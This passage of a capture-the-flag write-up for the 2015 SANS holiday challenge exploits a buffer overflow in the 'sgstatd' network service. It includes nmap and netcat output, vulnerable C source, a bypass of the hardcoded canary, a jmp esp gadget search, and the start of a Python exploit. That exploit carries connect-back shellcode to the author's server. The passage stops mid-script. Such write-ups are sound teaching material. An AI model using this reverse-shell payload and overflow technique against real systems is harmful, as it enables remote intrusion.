&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&amp;lt;p&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;File pending Nedfords approval.&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;[snip]
&lt;/pre&gt;&lt;/div&gt;
&lt;img alt="sg04_w00t.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg04_w00t.png" /&gt;
&lt;p&gt;The flag for this SuperGnome is &lt;code&gt;BU22_1729_2716057&lt;/code&gt;
(&lt;a class="reference external" href="https://en.wikipedia.org/wiki/Bender_%28Futurama%29"&gt;geeky reference&lt;/a&gt;).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id5"&gt;
&lt;h3&gt;&lt;a class="reference external" href="http://54.233.105.81/"&gt;SuperGnome05&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;This SuperGnome was particular: indeed, the vulnerability was not in the
web interface, but in a network service run by the SuperGnome. If we
take a look at the result of a &lt;code&gt;nmap&lt;/code&gt; command, we can see that
we can connect to the SuperGnome on the port 4242:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nmap 54.233.105.81

Starting Nmap 6.47 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2016-01-09 10:55 CET
Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; ec2-54-233-105-81.sa-east-1.compute.amazonaws.com &lt;span class="o"&gt;(&lt;/span&gt;54.233.105.81&lt;span class="o"&gt;)&lt;/span&gt;
Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.30s latency&lt;span class="o"&gt;)&lt;/span&gt;.
Not shown: &lt;span class="m"&gt;997&lt;/span&gt; filtered ports
PORT     STATE  SERVICE
80/tcp   open   http
4242/tcp open   vrml-multi-use
5555/tcp closed freeciv

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt; IP address &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; host up&lt;span class="o"&gt;)&lt;/span&gt; scanned in 22.17 seconds
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's connect to it using &lt;code&gt;netcat&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc 54.233.105.81 4242

Welcome to the SuperGnome Server Status Center!
Please enter one of the following options:

&lt;span class="m"&gt;1&lt;/span&gt; - Analyze hard disk usage
&lt;span class="m"&gt;2&lt;/span&gt; - List open TCP sockets
&lt;span class="m"&gt;3&lt;/span&gt; - Check logged in users
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, this seems to be a service to get some informations about
the SuperGnomes. Let's see if we have a copy of the binary
in our copy of the firmware&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -Rn &lt;span class="s2"&gt;&amp;quot;Welcome to the SuperGnome Server Status Center&amp;quot;&lt;/span&gt; .

Fichier binaire ./usr/bin/sgstatd correspondant
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so the binary program listening on the port 4242 seems to
be &lt;code&gt;/usr/bin/sgstatd&lt;/code&gt;. If we look carefully, we can
find the source for such a program on SuperGnome01:&lt;/p&gt;
&lt;img alt="sg01_file_list.png" class="align-center" src="/images/sans-christmas-challenge-2015/sg01_file_list.png" /&gt;
&lt;p&gt;You can download the source code &lt;a class="reference external" href="/docs/sans-christmas-challenge-2015/sgnet.zip"&gt;here&lt;/a&gt;
(sha256: &lt;code&gt;2343ce7345b960144fcb39ca01c2cf406e6db9a7847eaae6361d69ef5169d4e4&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Now let's look at the source code, and see where our input
are being processed (I cleaned it up a bit):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File sgstatd.c, line 21&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Welcome to the SuperGnome Server Status Center!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Please enter one of the following options:&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1 - Analyze hard disk usage&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;2 - List open TCP sockets&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;3 - Check logged in users&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;49&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/df&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to run command&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;sgnet_writes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/netstat -tan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to run command&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;sgnet_writes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;51&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/usr/bin/who&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to run command&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;sgnet_writes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="hll"&gt;    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="mi"&gt;88&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;/span&gt;        &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;Hidden command detected!&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Enter a short message to share with GnomeNet (please allow 10 seconds) =&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="hll"&gt;        &lt;span class="n"&gt;sgstatd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There seems to be a hidden command when we input &lt;code&gt;88&lt;/code&gt;, which is the
ASCII code of the letter &lt;code&gt;X&lt;/code&gt;. If we input &lt;code&gt;X&lt;/code&gt;, the function
&lt;code&gt;sgstatd&lt;/code&gt; is called. Let's take a look at it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;// File sgstatd.c, line 138&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;sgstatd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;__asm__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;movl $0xe4ffffe4, -4(%ebp)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;    &lt;span class="c1"&gt;//Canary pushed&lt;/span&gt;

    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;This function is protected!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;//recv(sd, &amp;amp;bin, 200, 0);&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="n"&gt;sgnet_readn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="n"&gt;__asm__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;movl -4(%ebp), %edx&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;xor $0xe4ffffe4, %edx&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;   &lt;span class="c1"&gt;// Canary checked&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;        &lt;span class="s"&gt;&amp;quot;jne sgnet_exit&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so the function &lt;code&gt;sgnet_readn&lt;/code&gt; seems to read data from the socket,
and stock it in a buffer. If we look at it, we can see that there is no
boundary checking. What's more, the buffer &lt;code&gt;bin&lt;/code&gt; only has 100 bytes
allocated, but the program reads and stores 200 bytes of data in it. Can
you say buffer-overflow!&lt;/p&gt;
&lt;p&gt;Let's take a look at the binary, to see what kind of security it as. i'm
using the &lt;code&gt;checksec.sh&lt;/code&gt; (available
&lt;a class="reference external" href="https://github.com/slimm609/checksec.sh"&gt;here&lt;/a&gt;) script to do so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;/checksec --file sgstatd
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH  FORTIFY FORTIFIED FORTIFY-able  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No  &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;8&lt;/span&gt;   sgstatd
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, make sure you run the script on the binary from the firmware, and not
on a binary you compiled from the source code.&lt;/p&gt;
&lt;p&gt;We can see that there is no stack canary, and that &lt;code&gt;NX&lt;/code&gt; is disabled.
This means that we can put our shellcode directly on the stack. Plus,
&lt;code&gt;PIE&lt;/code&gt; is also disabled, so we can use a gadget from our base code, and
its position will be the same on the distant binary.&lt;/p&gt;
&lt;p&gt;Also there is no stack canary, we can see in the code from the &lt;code&gt;sgstatd&lt;/code&gt;
function that there is a hardcoded canary: &lt;code&gt;0xe4ffffe4&lt;/code&gt;. We have to
have this value in our final payload.&lt;/p&gt;
&lt;p&gt;Now, let's find a &lt;code&gt;jmp esp&lt;/code&gt; gadget in our binary, so that we can continue
the flow of execution on the stack. The opcode for such an instruction is
&lt;code&gt;ff e4&lt;/code&gt;. If this value is familiar, it's because it's used in the custom
stack canary (clever organizers)!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;objdump -M intel -d sgstatd &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;ff e4&amp;quot;&lt;/span&gt;
 8049366:   c7 &lt;span class="m"&gt;45&lt;/span&gt; &lt;span class="nb"&gt;fc &lt;/span&gt;e4 ff ff e4    mov    DWORD PTR &lt;span class="o"&gt;[&lt;/span&gt;ebp-0x4&lt;span class="o"&gt;]&lt;/span&gt;,0xe4ffffe4
 80493b2:   &lt;span class="m"&gt;81&lt;/span&gt; f2 e4 ff ff e4       xor    edx,0xe4ffffe4
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, our &lt;code&gt;jmp esp&lt;/code&gt; gadget is available at the address &lt;code&gt;0x0804936b&lt;/code&gt;.
Let's see the exploit code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c"&gt;# This is a connect-back shellcode, configured to connect back&lt;/span&gt;
    &lt;span class="c"&gt;# to a server I own, on the port 8080.&lt;/span&gt;
    &lt;span class="c"&gt;# Thanks to http://shell-storm.org/shellcode/&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xcd\x80\x92\xb0\x66\x68\x51\x39\x0B\x02\x66\x68\x1f\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x89\xe3\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;

    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;104&lt;/span&gt; &lt;span class="c"&gt;# padding to overwrite the saved value of eip&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xe4\xff\xff\xe4&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="c"&gt;# canary stack&lt;/span&gt;
    &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x6b\x93\x04\x08&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="c"&gt;# address of our &amp;#39;jump esp&amp;#39; gadget&lt;/span&gt;
